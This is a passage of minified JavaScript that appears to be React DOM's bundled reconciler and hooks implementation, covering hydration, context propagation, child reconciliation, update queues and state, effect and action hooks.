Ri(e,t){ki[Ai++]=Mi,ki[Ai++]=Ni,ki[Ai++]=ji,Mi=t.id,Ni=t.overflow,ji=e}var N=null,P=null,F=!1,zi=null,Bi=!1,Vi=Error(i(519));function Hi(e){throw Ji(wi(Error(i(418,1<arguments.length&&arguments[1]!==void 0&&arguments[1]?`text`:`HTML`,``)),e)),Vi}function Ui(e){var t=e.stateNode,n=e.type,r=e.memoizedProps;switch(t[mt]=e,t[ht]=r,n){case`dialog`:K(`cancel`,t),K(`close`,t);break;case`iframe`:case`object`:case`embed`:K(`load`,t);break;case`video`:case`audio`:for(n=0;n<Cd.length;n++)K(Cd[n],t);break;case`source`:K(`error`,t);break;case`img`:case`image`:case`link`:K(`error`,t),K(`load`,t);break;case`details`:K(`toggle`,t);break;case`input`:K(`invalid`,t),Jt(t,r.value,r.defaultValue,r.checked,r.defaultChecked,r.type,r.name,!0);break;case`select`:K(`invalid`,t);break;case`textarea`:K(`invalid`,t),Qt(t,r.value,r.defaultValue,r.children)}n=r.children,typeof n!=`string`&&typeof n!=`number`&&typeof n!=`bigint`||t.textContent===``+n||!0===r.suppressHydrationWarning||Rd(t.textContent,n)?(r.popover!=null&&(K(`beforetoggle`,t),K(`toggle`,t)),r.onScroll!=null&&K(`scroll`,t),r.onScrollEnd!=null&&K(`scrollend`,t),r.onClick!=null&&(t.onclick=cn),t=!0):t=!1,t||Hi(e,!0)}function Wi(e){for(N=e.return;N;)switch(N.tag){case 5:case 31:case 13:Bi=!1;return;case 27:case 3:Bi=!0;return;default:N=N.return}}function Gi(e){if(e!==N)return!1;if(!F)return Wi(e),F=!0,!1;var t=e.tag,n;if((n=t!==3&&t!==27)&&((n=t===5)&&(n=e.type,n=!(n!==`form`&&n!==`button`)||Yd(e.type,e.memoizedProps)),n=!n),n&&P&&Hi(e),Wi(e),t===13){if(e=e.memoizedState,e=e===null?null:e.dehydrated,!e)throw Error(i(317));P=gf(e)}else if(t===31){if(e=e.memoizedState,e=e===null?null:e.dehydrated,!e)throw Error(i(317));P=gf(e)}else t===27?(t=P,rf(e.type)?(e=hf,hf=null,P=e):P=t):P=N?mf(e.stateNode.nextSibling):null;return!0}function Ki(){P=N=null,F=!1}function qi(){var e=zi;return e!==null&&(iu===null?iu=e:iu.push.apply(iu,e),zi=null),e}function Ji(e){zi===null?zi=[e]:zi.push(e)}var Yi=ue(null),Xi=null,Zi=null;function Qi(e,t,n){fe(Yi,t._currentValue),t._currentValue=n}function $i(e){e._currentValue=Yi.current,de(Yi)}function ea(e,t,n){for(;e!==null;){var r=e.alternate;if((e.childLanes&t)===t?r!==null&&(r.childLanes&t)!==t&&(r.childLanes|=t):(e.childLanes|=t,r!==null&&(r.childLanes|=t)),e===n)break;e=e.return}}function ta(e,t,n,r){var a=e.child;for(a!==null&&(a.return=e);a!==null;){var o=a.dependencies;if(o!==null){var s=a.child;o=o.firstContext;a:for(;o!==null;){var c=o;o=a;for(var l=0;l<t.length;l++)if(c.context===t[l]){o.lanes|=n,c=o.alternate,c!==null&&(c.lanes|=n),ea(o.return,n,e),r||(s=null);break a}o=c.next}}else if(a.tag===18){if(s=a.return,s===null)throw Error(i(341));s.lanes|=n,o=s.alternate,o!==null&&(o.lanes|=n),ea(s,n,e),s=null}else s=a.child;if(s!==null)s.return=a;else for(s=a;s!==null;){if(s===e){s=null;break}if(a=s.sibling,a!==null){a.return=s.return,s=a;break}s=s.return}a=s}}function I(e,t,n,r){e=null;for(var a=t,o=!1;a!==null;){if(!o){if(a.flags&524288)o=!0;else if(a.flags&262144)break}if(a.tag===10){var s=a.alternate;if(s===null)throw Error(i(387));if(s=s.memoizedProps,s!==null){var c=a.type;Ar(a.pendingProps.value,s.value)||(e===null?e=[c]:e.push(c))}}else if(a===ge.current){if(s=a.alternate,s===null)throw Error(i(387));s.memoizedState.memoizedState!==a.memoizedState.memoizedState&&(e===null?e=[ip]:e.push(ip))}a=a.return}e!==null&&ta(t,e,n,r),t.flags|=262144}function na(e){for(e=e.firstContext;e!==null;){if(!Ar(e.context._currentValue,e.memoizedValue))return!0;e=e.next}return!1}function ra(e){Xi=e,Zi=null,e=e.dependencies,e!==null&&(e.firstContext=null)}function ia(e){return oa(Xi,e)}function aa(e,t){return Xi===null&&ra(e),oa(e,t)}function oa(e,t){var n=t._currentValue;if(t={context:t,memoizedValue:n,next:null},Zi===null){if(e===null)throw Error(i(308));Zi=t,e.dependencies={lanes:0,firstContext:t},e.flags|=524288}else Zi=Zi.next=t;return n}var sa=typeof AbortController<`u`?AbortController:function(){var e=[],t=this.signal={aborted:!1,addEventListener:function(t,n){e.push(n)}};this.abort=function(){t.aborted=!0,e.forEach(function(e){return e()})}},ca=t.unstable_scheduleCallback,la=t.unstable_NormalPriority,ua={$$typeof:C,Consumer:null,Provider:null,_currentValue:null,_currentValue2:null,_threadCount:0};function da(){return{controller:new sa,data:new Map,refCount:0}}function fa(e){e.refCount--,e.refCount===0&&ca(la,function(){e.controller.abort()})}var pa=null,ma=0,ha=0,ga=null;function _a(e,t){if(pa===null){var n=pa=[];ma=0,ha=vd(),ga={status:`pending`,value:void 0,then:function(e){n.push(e)}}}return ma++,t.then(va,va),t}function va(){if(--ma===0&&pa!==null){ga!==null&&(ga.status=`fulfilled`);var e=pa;pa=null,ha=0,ga=null;for(var t=0;t<e.length;t++)(0,e[t])()}}function ya(e,t){var n=[],r={status:`pending`,value:null,reason:null,then:function(e){n.push(e)}};return e.then(function(){r.status=`fulfilled`,r.value=t;for(var e=0;e<n.length;e++)(0,n[e])(t)},function(e){for(r.status=`rejected`,r.reason=e,e=0;e<n.length;e++)(0,n[e])(void 0)}),r}var ba=k.S;k.S=function(e,t){su=Ne(),typeof t==`object`&&t&&typeof t.then==`function`&&_a(e,t),ba!==null&&ba(e,t)};var xa=ue(null);function Sa(){var e=xa.current;return e===null?B.pooledCache:e}function Ca(e,t){t===null?fe(xa,xa.current):fe(xa,t.pool)}function wa(){var e=Sa();return e===null?null:{parent:ua._currentValue,pool:e}}var Ta=Error(i(460)),Ea=Error(i(474)),Da=Error(i(542)),Oa={then:function(){}};function ka(e){return e=e.status,e===`fulfilled`||e===`rejected`}function Aa(e,t,n){switch(n=e[n],n===void 0?e.push(t):n!==t&&(t.then(cn,cn),t=n),t.status){case`fulfilled`:return t.value;case`rejected`:throw e=t.reason,Pa(e),e;default:if(typeof t.status==`string`)t.then(cn,cn);else{if(e=B,e!==null&&100<e.shellSuspendCounter)throw Error(i(482));e=t,e.status=`pending`,e.then(function(e){if(t.status===`pending`){var n=t;n.status=`fulfilled`,n.value=e}},function(e){if(t.status===`pending`){var n=t;n.status=`rejected`,n.reason=e}})}switch(t.status){case`fulfilled`:return t.value;case`rejected`:throw e=t.reason,Pa(e),e}throw Ma=t,Ta}}function ja(e){try{var t=e._init;return t(e._payload)}catch(e){throw typeof e==`object`&&e&&typeof e.then==`function`?(Ma=e,Ta):e}}var Ma=null;function Na(){if(Ma===null)throw Error(i(459));var e=Ma;return Ma=null,e}function Pa(e){if(e===Ta||e===Da)throw Error(i(483))}var Fa=null,Ia=0;function La(e){var t=Ia;return Ia+=1,Fa===null&&(Fa=[]),Aa(Fa,e,t)}function Ra(e,t){t=t.props.ref,e.ref=t===void 0?null:t}function za(e,t){throw t.$$typeof===m?Error(i(525)):(e=Object.prototype.toString.call(t),Error(i(31,e===`[object Object]`?`object with keys {`+Object.keys(t).join(`, `)+`}`:e)))}function Ba(e){function t(t,n){if(e){var r=t.deletions;r===null?(t.deletions=[n],t.flags|=16):r.push(n)}}function n(n,r){if(!e)return null;for(;r!==null;)t(n,r),r=r.sibling;return null}function r(e){for(var t=new Map;e!==null;)e.key===null?t.set(e.index,e):t.set(e.key,e),e=e.sibling;return t}function a(e,t){return e=gi(e,t),e.index=0,e.sibling=null,e}function o(t,n,r){return t.index=r,e?(r=t.alternate,r===null?(t.flags|=67108866,n):(r=r.index,r<n?(t.flags|=67108866,n):r)):(t.flags|=1048576,n)}function s(t){return e&&t.alternate===null&&(t.flags|=67108866),t}function c(e,t,n,r){return t===null||t.tag!==6?(t=bi(n,e.mode,r),t.return=e,t):(t=a(t,n),t.return=e,t)}function l(e,t,n,r){var i=n.type;return i===y?d(e,t,n.props.children,r,n.key):t!==null&&(t.elementType===i||typeof i==`object`&&i&&i.$$typeof===D&&ja(i)===t.type)?(t=a(t,n.props),Ra(t,n),t.return=e,t):(t=vi(n.type,n.key,n.props,null,e.mode,r),Ra(t,n),t.return=e,t)}function u(e,t,n,r){return t===null||t.tag!==4||t.stateNode.containerInfo!==n.containerInfo||t.stateNode.implementation!==n.implementation?(t=Si(n,e.mode,r),t.return=e,t):(t=a(t,n.children||[]),t.return=e,t)}function d(e,t,n,r,i){return t===null||t.tag!==7?(t=yi(n,e.mode,r,i),t.return=e,t):(t=a(t,n),t.return=e,t)}function f(e,t,n){if(typeof t==`string`&&t!==``||typeof t==`number`||typeof t==`bigint`)return t=bi(``+t,e.mode,n),t.return=e,t;if(typeof t==`object`&&t){switch(t.$$typeof){case g:return n=vi(t.type,t.key,t.props,null,e.mode,n),Ra(n,t),n.return=e,n;case v:return t=Si(t,e.mode,n),t.return=e,t;case D:return t=ja(t),f(e,t,n)}if(oe(t)||re(t))return t=yi(t,e.mode,n,null),t.return=e,t;if(typeof t.then==`function`)return f(e,La(t),n);if(t.$$typeof===C)return f(e,aa(e,t),n);za(e,t)}return null}function p(e,t,n,r){var i=t===null?null:t.key;if(typeof n==`string`&&n!==``||typeof n==`number`||typeof n==`bigint`)return i===null?c(e,t,``+n,r):null;if(typeof n==`object`&&n){switch(n.$$typeof){case g:return n.key===i?l(e,t,n,r):null;case v:return n.key===i?u(e,t,n,r):null;case D:return n=ja(n),p(e,t,n,r)}if(oe(n)||re(n))return i===null?d(e,t,n,r,null):null;if(typeof n.then==`function`)return p(e,t,La(n),r);if(n.$$typeof===C)return p(e,t,aa(e,n),r);za(e,n)}return null}function m(e,t,n,r,i){if(typeof r==`string`&&r!==``||typeof r==`number`||typeof r==`bigint`)return e=e.get(n)||null,c(t,e,``+r,i);if(typeof r==`object`&&r){switch(r.$$typeof){case g:return e=e.get(r.key===null?n:r.key)||null,l(t,e,r,i);case v:return e=e.get(r.key===null?n:r.key)||null,u(t,e,r,i);case D:return r=ja(r),m(e,t,n,r,i)}if(oe(r)||re(r))return e=e.get(n)||null,d(t,e,r,i,null);if(typeof r.then==`function`)return m(e,t,n,La(r),i);if(r.$$typeof===C)return m(e,t,n,aa(t,r),i);za(t,r)}return null}function h(i,a,s,c){for(var l=null,u=null,d=a,h=a=0,g=null;d!==null&&h<s.length;h++){d.index>h?(g=d,d=null):g=d.sibling;var _=p(i,d,s[h],c);if(_===null){d===null&&(d=g);break}e&&d&&_.alternate===null&&t(i,d),a=o(_,a,h),u===null?l=_:u.sibling=_,u=_,d=g}if(h===s.length)return n(i,d),F&&Pi(i,h),l;if(d===null){for(;h<s.length;h++)d=f(i,s[h],c),d!==null&&(a=o(d,a,h),u===null?l=d:u.sibling=d,u=d);return F&&Pi(i,h),l}for(d=r(d);h<s.length;h++)g=m(d,i,h,s[h],c),g!==null&&(e&&g.alternate!==null&&d.delete(g.key===null?h:g.key),a=o(g,a,h),u===null?l=g:u.sibling=g,u=g);return e&&d.forEach(function(e){return t(i,e)}),F&&Pi(i,h),l}function _(a,s,c,l){if(c==null)throw Error(i(151));for(var u=null,d=null,h=s,g=s=0,_=null,v=c.next();h!==null&&!v.done;g++,v=c.next()){h.index>g?(_=h,h=null):_=h.sibling;var y=p(a,h,v.value,l);if(y===null){h===null&&(h=_);break}e&&h&&y.alternate===null&&t(a,h),s=o(y,s,g),d===null?u=y:d.sibling=y,d=y,h=_}if(v.done)return n(a,h),F&&Pi(a,g),u;if(h===null){for(;!v.done;g++,v=c.next())v=f(a,v.value,l),v!==null&&(s=o(v,s,g),d===null?u=v:d.sibling=v,d=v);return F&&Pi(a,g),u}for(h=r(h);!v.done;g++,v=c.next())v=m(h,a,g,v.value,l),v!==null&&(e&&v.alternate!==null&&h.delete(v.key===null?g:v.key),s=o(v,s,g),d===null?u=v:d.sibling=v,d=v);return e&&h.forEach(function(e){return t(a,e)}),F&&Pi(a,g),u}function b(e,r,o,c){if(typeof o==`object`&&o&&o.type===y&&o.key===null&&(o=o.props.children),typeof o==`object`&&o){switch(o.$$typeof){case g:a:{for(var l=o.key;r!==null;){if(r.key===l){if(l=o.type,l===y){if(r.tag===7){n(e,r.sibling),c=a(r,o.props.children),c.return=e,e=c;break a}}else if(r.elementType===l||typeof l==`object`&&l&&l.$$typeof===D&&ja(l)===r.type){n(e,r.sibling),c=a(r,o.props),Ra(c,o),c.return=e,e=c;break a}n(e,r);break}else t(e,r);r=r.sibling}o.type===y?(c=yi(o.props.children,e.mode,c,o.key),c.return=e,e=c):(c=vi(o.type,o.key,o.props,null,e.mode,c),Ra(c,o),c.return=e,e=c)}return s(e);case v:a:{for(l=o.key;r!==null;){if(r.key===l)if(r.tag===4&&r.stateNode.containerInfo===o.containerInfo&&r.stateNode.implementation===o.implementation){n(e,r.sibling),c=a(r,o.children||[]),c.return=e,e=c;break a}else{n(e,r);break}else t(e,r);r=r.sibling}c=Si(o,e.mode,c),c.return=e,e=c}return s(e);case D:return o=ja(o),b(e,r,o,c)}if(oe(o))return h(e,r,o,c);if(re(o)){if(l=re(o),typeof l!=`function`)throw Error(i(150));return o=l.call(o),_(e,r,o,c)}if(typeof o.then==`function`)return b(e,r,La(o),c);if(o.$$typeof===C)return b(e,r,aa(e,o),c);za(e,o)}return typeof o==`string`&&o!==``||typeof o==`number`||typeof o==`bigint`?(o=``+o,r!==null&&r.tag===6?(n(e,r.sibling),c=a(r,o),c.return=e,e=c):(n(e,r),c=bi(o,e.mode,c),c.return=e,e=c),s(e)):n(e,r)}return function(e,t,n,r){try{Ia=0;var i=b(e,t,n,r);return Fa=null,i}catch(t){if(t===Ta||t===Da)throw t;var a=M(29,t,null,e.mode);return a.lanes=r,a.return=e,a}}}var Va=Ba(!0),Ha=Ba(!1),Ua=!1;function Wa(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,lanes:0,hiddenCallbacks:null},callbacks:null}}function Ga(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,callbacks:null})}function Ka(e){return{lane:e,tag:0,payload:null,callback:null,next:null}}function qa(e,t,n){var r=e.updateQueue;if(r===null)return null;if(r=r.shared,z&2){var i=r.pending;return i===null?t.next=t:(t.next=i.next,i.next=t),r.pending=t,t=fi(e),di(e,null,n),t}return ci(e,r,t,n),fi(e)}function Ja(e,t,n){if(t=t.updateQueue,t!==null&&(t=t.shared,n&4194048)){var r=t.lanes;r&=e.pendingLanes,n|=r,t.lanes=n,st(e,n)}}function Ya(e,t){var n=e.updateQueue,r=e.alternate;if(r!==null&&(r=r.updateQueue,n===r)){var i=null,a=null;if(n=n.firstBaseUpdate,n!==null){do{var o={lane:n.lane,tag:n.tag,payload:n.payload,callback:null,next:null};a===null?i=a=o:a=a.next=o,n=n.next}while(n!==null);a===null?i=a=t:a=a.next=t}else i=a=t;n={baseState:r.baseState,firstBaseUpdate:i,lastBaseUpdate:a,shared:r.shared,callbacks:r.callbacks},e.updateQueue=n;return}e=n.lastBaseUpdate,e===null?n.firstBaseUpdate=t:e.next=t,n.lastBaseUpdate=t}var Xa=!1;function Za(){if(Xa){var e=ga;if(e!==null)throw e}}function Qa(e,t,n,r){Xa=!1;var i=e.updateQueue;Ua=!1;var a=i.firstBaseUpdate,o=i.lastBaseUpdate,s=i.shared.pending;if(s!==null){i.shared.pending=null;var c=s,l=c.next;c.next=null,o===null?a=l:o.next=l,o=c;var u=e.alternate;u!==null&&(u=u.updateQueue,s=u.lastBaseUpdate,s!==o&&(s===null?u.firstBaseUpdate=l:s.next=l,u.lastBaseUpdate=c))}if(a!==null){var d=i.baseState;o=0,u=l=c=null,s=a;do{var p=s.lane&-536870913,m=p!==s.lane;if(m?(H&p)===p:(r&p)===p){p!==0&&p===ha&&(Xa=!0),u!==null&&(u=u.next={lane:0,tag:s.tag,payload:s.payload,callback:null,next:null});a:{var h=e,g=s;p=t;var _=n;switch(g.tag){case 1:if(h=g.payload,typeof h==`function`){d=h.call(_,d,p);break a}d=h;break a;case 3:h.flags=h.flags&-65537|128;case 0:if(h=g.payload,p=typeof h==`function`?h.call(_,d,p):h,p==null)break a;d=f({},d,p);break a;case 2:Ua=!0}}p=s.callback,p!==null&&(e.flags|=64,m&&(e.flags|=8192),m=i.callbacks,m===null?i.callbacks=[p]:m.push(p))}else m={lane:p,tag:s.tag,payload:s.payload,callback:s.callback,next:null},u===null?(l=u=m,c=d):u=u.next=m,o|=p;if(s=s.next,s===null){if(s=i.shared.pending,s===null)break;m=s,s=m.next,m.next=null,i.lastBaseUpdate=m,i.shared.pending=null}}while(1);u===null&&(c=d),i.baseState=c,i.firstBaseUpdate=l,i.lastBaseUpdate=u,a===null&&(i.shared.lanes=0),Ql|=o,e.lanes=o,e.memoizedState=d}}function $a(e,t){if(typeof e!=`function`)throw Error(i(191,e));e.call(t)}function eo(e,t){var n=e.callbacks;if(n!==null)for(e.callbacks=null,e=0;e<n.length;e++)$a(n[e],t)}var to=ue(null),no=ue(0);function ro(e,t){e=Xl,fe(no,e),fe(to,t),Xl=e|t.baseLanes}function io(){fe(no,Xl),fe(to,to.current)}function ao(){Xl=no.current,de(to),de(no)}var oo=ue(null),so=null;function co(e){var t=e.alternate;fe(mo,mo.current&1),fe(oo,e),so===null&&(t===null||to.current!==null||t.memoizedState!==null)&&(so=e)}function lo(e){fe(mo,mo.current),fe(oo,e),so===null&&(so=e)}function uo(e){e.tag===22?(fe(mo,mo.current),fe(oo,e),so===null&&(so=e)):fo(e)}function fo(){fe(mo,mo.current),fe(oo,oo.current)}function po(e){de(oo),so===e&&(so=null),de(mo)}var mo=ue(0);function ho(e){for(var t=e;t!==null;){if(t.tag===13){var n=t.memoizedState;if(n!==null&&(n=n.dehydrated,n===null||df(n)||ff(n)))return t}else if(t.tag===19&&(t.memoizedProps.revealOrder===`forwards`||t.memoizedProps.revealOrder===`backwards`||t.memoizedProps.revealOrder===`unstable_legacy-backwards`||t.memoizedProps.revealOrder===`together`)){if(t.flags&128)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var go=0,L=null,R=null,_o=null,vo=!1,yo=!1,bo=!1,xo=0,So=0,Co=null,wo=0;function To(){throw Error(i(321))}function Eo(e,t){if(t===null)return!1;for(var n=0;n<t.length&&n<e.length;n++)if(!Ar(e[n],t[n]))return!1;return!0}function Do(e,t,n,r,i,a){return go=a,L=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,k.H=e===null||e.memoizedState===null?Ws:Gs,bo=!1,a=n(r,i),bo=!1,yo&&(a=ko(t,n,r,i)),Oo(e),a}function Oo(e){k.H=Us;var t=R!==null&&R.next!==null;if(go=0,_o=R=L=null,vo=!1,So=0,Co=null,t)throw Error(i(300));e===null||cc||(e=e.dependencies,e!==null&&na(e)&&(cc=!0))}function ko(e,t,n,r){L=e;var a=0;do{if(yo&&(Co=null),So=0,yo=!1,25<=a)throw Error(i(301));if(a+=1,_o=R=null,e.updateQueue!=null){var o=e.updateQueue;o.lastEffect=null,o.events=null,o.stores=null,o.memoCache!=null&&(o.memoCache.index=0)}k.H=Ks,o=t(n,r)}while(yo);return o}function Ao(){var e=k.H,t=e.useState()[0];return t=typeof t.then==`function`?Lo(t):t,e=e.useState()[0],(R===null?null:R.memoizedState)!==e&&(L.flags|=1024),t}function jo(){var e=xo!==0;return xo=0,e}function Mo(e,t,n){t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~n}function No(e){if(vo){for(e=e.memoizedState;e!==null;){var t=e.queue;t!==null&&(t.pending=null),e=e.next}vo=!1}go=0,_o=R=L=null,yo=!1,So=xo=0,Co=null}function Po(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return _o===null?L.memoizedState=_o=e:_o=_o.next=e,_o}function Fo(){if(R===null){var e=L.alternate;e=e===null?null:e.memoizedState}else e=R.next;var t=_o===null?L.memoizedState:_o.next;if(t!==null)_o=t,R=e;else{if(e===null)throw L.alternate===null?Error(i(467)):Error(i(310));R=e,e={memoizedState:R.memoizedState,baseState:R.baseState,baseQueue:R.baseQueue,queue:R.queue,next:null},_o===null?L.memoizedState=_o=e:_o=_o.next=e}return _o}function Io(){return{lastEffect:null,events:null,stores:null,memoCache:null}}function Lo(e){var t=So;return So+=1,Co===null&&(Co=[]),e=Aa(Co,e,t),t=L,(_o===null?t.memoizedState:_o.next)===null&&(t=t.alternate,k.H=t===null||t.memoizedState===null?Ws:Gs),e}function Ro(e){if(typeof e==`object`&&e){if(typeof e.then==`function`)return Lo(e);if(e.$$typeof===C)return ia(e)}throw Error(i(438,String(e)))}function zo(e){var t=null,n=L.updateQueue;if(n!==null&&(t=n.memoCache),t==null){var r=L.alternate;r!==null&&(r=r.updateQueue,r!==null&&(r=r.memoCache,r!=null&&(t={data:r.data.map(function(e){return e.slice()}),index:0})))}if(t??={data:[],index:0},n===null&&(n=Io(),L.updateQueue=n),n.memoCache=t,n=t.data[t.index],n===void 0)for(n=t.data[t.index]=Array(e),r=0;r<e;r++)n[r]=te;return t.index++,n}function Bo(e,t){return typeof t==`function`?t(e):t}function Vo(e){return Ho(Fo(),R,e)}function Ho(e,t,n){var r=e.queue;if(r===null)throw Error(i(311));r.lastRenderedReducer=n;var a=e.baseQueue,o=r.pending;if(o!==null){if(a!==null){var s=a.next;a.next=o.next,o.next=s}t.baseQueue=a=o,r.pending=null}if(o=e.baseState,a===null)e.memoizedState=o;else{t=a.next;var c=s=null,l=null,u=t,d=!1;do{var f=u.lane&-536870913;if(f===u.lane?(go&f)===f:(H&f)===f){var p=u.revertLane;if(p===0)l!==null&&(l=l.next={lane:0,revertLane:0,gesture:null,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null}),f===ha&&(d=!0);else if((go&p)===p){u=u.next,p===ha&&(d=!0);continue}else f={lane:0,revertLane:u.revertLane,gesture:null,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null},l===null?(c=l=f,s=o):l=l.next=f,L.lanes|=p,Ql|=p;f=u.action,bo&&n(o,f),o=u.hasEagerState?u.eagerState:n(o,f)}else p={lane:f,revertLane:u.revertLane,gesture:u.gesture,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null},l===null?(c=l=p,s=o):l=l.next=p,L.lanes|=f,Ql|=f;u=u.next}while(u!==null&&u!==t);if(l===null?s=o:l.next=c,!Ar(o,e.memoizedState)&&(cc=!0,d&&(n=ga,n!==null)))throw n;e.memoizedState=o,e.baseState=s,e.baseQueue=l,r.lastRenderedState=o}return a===null&&(r.lanes=0),[e.memoizedState,r.dispatch]}function Uo(e){var t=Fo(),n=t.queue;if(n===null)throw Error(i(311));n.lastRenderedReducer=e;var r=n.dispatch,a=n.pending,o=t.memoizedState;if(a!==null){n.pending=null;var s=a=a.next;do o=e(o,s.action),s=s.next;while(s!==a);Ar(o,t.memoizedState)||(cc=!0),t.memoizedState=o,t.baseQueue===null&&(t.baseState=o),n.lastRenderedState=o}return[o,r]}function Wo(e,t,n){var r=L,a=Fo(),o=F;if(o){if(n===void 0)throw Error(i(407));n=n()}else n=t();var s=!Ar((R||a).memoizedState,n);if(s&&(a.memoizedState=n,cc=!0),a=a.queue,hs(qo.bind(null,r,a,e),[e]),a.getSnapshot!==t||s||_o!==null&&_o.memoizedState.tag&1){if(r.flags|=2048,us(9,{destroy:void 0},Ko.bind(null,r,a,n,t),null),B===null)throw Error(i(349));o||go&127||Go(r,t,n)}return n}function Go(e,t,n){e.flags|=16384,e={getSnapshot:t,value:n},t=L.updateQueue,t===null?(t=Io(),L.updateQueue=t,t.stores=[e]):(n=t.stores,n===null?t.stores=[e]:n.push(e))}function Ko(e,t,n,r){t.value=n,t.getSnapshot=r,Jo(t)&&Yo(e)}function qo(e,t,n){return n(function(){Jo(t)&&Yo(e)})}function Jo(e){var t=e.getSnapshot;e=e.value;try{var n=t();return!Ar(e,n)}catch{return!0}}function Yo(e){var t=ui(e,2);t!==null&&Su(t,e,2)}function Xo(e){var t=Po();if(typeof e==`function`){var n=e;if(e=n(),bo){We(!0);try{n()}finally{We(!1)}}}return t.memoizedState=t.baseState=e,t.queue={pending:null,lanes:0,dispatch:null,lastRenderedReducer:Bo,lastRenderedState:e},t}function Zo(e,t,n,r){return e.baseState=n,Ho(e,R,typeof r==`function`?r:Bo)}function Qo(e,t,n,r,a){if(Bs(e))throw Error(i(485));if(e=t.action,e!==null){var o={payload:a,action:e,next:null,isTransition:!0,status:`pending`,value:null,reason:null,listeners:[],then:function(e){o.listeners.push(e)}};k.T===null?o.isTransition=!1:n(!0),r(o),n=t.pending,n===null?(o.next=t.pending=o,$o(t,o)):(o.next=n.next,t.pending=n.next=o)}}function $o(e,t){var n=t.action,r=t.payload,i=e.state;if(t.isTransition){var a=k.T,o={};k.T=o;try{var s=n(i,r),c=k.S;c!==null&&c(o,s),es(e,t,s)}catch(n){ns(e,t,n)}finally{a!==null&&o.types!==null&&(a.types=o.types),k.T=a}}else try{a=n(i,r),es(e,t,a)}catch(n){ns(e,t,n)}}function es(e,t,n){typeof n==`object`&&n&&typeof n.then==`function`?n.then(function(n){ts(e,t,n)},function(n){return ns(e,t,n)}):ts(e,t,n)}function ts(e,t,n){t.status=`fulfilled`,t.value=n,rs(t),e.state=n,t=e.pending,t!==null&&(n=t.next,n===t?e.pending=null:(n=n.next,t.next=n,$o(e,n)))}function ns(e,t,n){var r=e.pending;if(e.pending=null,r!==null){r=r.next;do t.status=`rejected`,t.reason=n,rs(t),t=t.next;while(t!==r)}e.action=null}function rs(e){e=e.listeners;for(var t=0;t<e.length;t++)(0,e[t])()}function is(e,t){return t}function as(e,t){if(F){var n=B.formState;if(n!==null){a:{var r=L;if(F){if(P){b:{for(var i=P,a=Bi;i.nodeType!==8;){if(!a){i=null;break b}if(i=mf(i.nextSibling),i===null){i=null;break b}}a=i.data,i=a===`F!`||a===`F`?i:null}if(i){P=mf(i.nextSibling),r=i.data===`F!`;break a}}Hi(r)}r=!1}r&&(t=n[0])}}return n=Po(),n.memoizedState=n.baseState=t,r={pending:null,lanes:0,dispatch:null,lastRenderedReducer:is,lastRenderedState:t},n.queue=r,n=Ls.bind(null,L,r),r.dispatch=n,r=Xo(!1),a=zs.bind(null,L,!1,r.queue),r=Po(),i={state:t,dispatch:null,action:e,pending:null},r.queue=i,n=Qo.bind(null,L,i,a,n),i.dispatch=n,r.memoizedState=e,[t,n,!1]}function os(e){return ss(Fo(),R,e)}function ss(e,t,n){if(t=Ho(e,t,is)[0],e=Vo(Bo)[0],typeof t==`object`&&t&&typeof t.then==`function`)try{var r=Lo(t)}catch(e){throw e===Ta?Da:e}else r=t;t=Fo();var i=t.queue,a=i.dispatch;return n!==t.memoizedState&&(L.flags|=2048,us(9,{destroy:void 0},cs.bind(null,i,n),null)),[r,a,e]}function cs(e,t){e.action=t}function ls(e){var t=Fo(),n=R;if(n!==null)return ss(t,n,e);Fo(),t=t.memoizedState,n=Fo();var r=n.queue.dispatch;return n.memoizedState=e,[t,r,!1]}function us(e,t,n,r){return e={tag:e,create:n,deps:r,inst:t,next:null},t=L.updateQueue,t===null&&(t=Io(),L.updateQueue=t),n=t.lastEffect,n===null?t.lastEffect=e.next=e:(r=n.next,n.next=e,e.next=r,t.lastEffect=e),e}function ds(){return Fo().memoizedState}function fs(e,t,n,r){var i=Po();L.flags|=e,i.memoizedState=us(1|t,{destroy:void 0},n,r===void 0?null:r)}function ps(e,t,n,r){var i=Fo();r=r===void 0?null:r;var a=i.memoizedState.inst;R!==null&&r!==null&&Eo(r,R.memoizedState.deps)?i.memoizedState=us(t,a,n,r):(L.flags|=e,i.memoizedState=us(1|t,a,n,r))}function ms(e,t){fs(8390656,8,e,t)}function hs(e,t){ps(2048,8,e,t)}function gs(e){L.flags|=4;var t=L.updateQueue;if(t===null)t=Io(),L.updateQueue=t,t.events=[e];else{var n=t.events;n===null?t.events=[e]:n.push(e)}}function _s(e){var t=Fo().memoizedState;return gs({ref:t,nextImpl:e}),function(){if(z&2)throw Error(i(440));return t.impl.apply(void 0,arguments)}}function vs(e,t){return ps(4,2,e,t)}function ys(e,t){return ps(4,4,e,t)}function bs(e,t){if(typeof t==`function`){e=e();var n=t(e);return function(){typeof n==`function`?n():t(null)}}if(t!=null)return e=e(),t.current=e,function(){t.current=null}}function xs(e,t,n){n=n==null?null:n.concat([e]),ps(4,4,bs.bind(null,t,e),n)}function Ss(){}function Cs(e,t){var n=Fo();t=t===void 0?null:t;var r=n.memoizedState;return t!==null&&Eo(t,r[1])?r[0]:(n.memoizedState=[e,t],e)}function ws(e,t){var n=Fo();t=t===void 0?null:t;var r=n.memoizedState;if(t!==null&&Eo(t,r[1]))return r[0];if(r=e(),bo){We(!0);try{e()}finally{We(!1)}}return n.memoizedState=[r,t],r}function Ts(e,t,n){return n===void 0||go&1073741824&&!(H&261930)?e.memoizedState=t:(e.memoizedState=n,e=xu(),L.lanes|=e,Ql|=e,n)}function Es(e,t,n,r){return 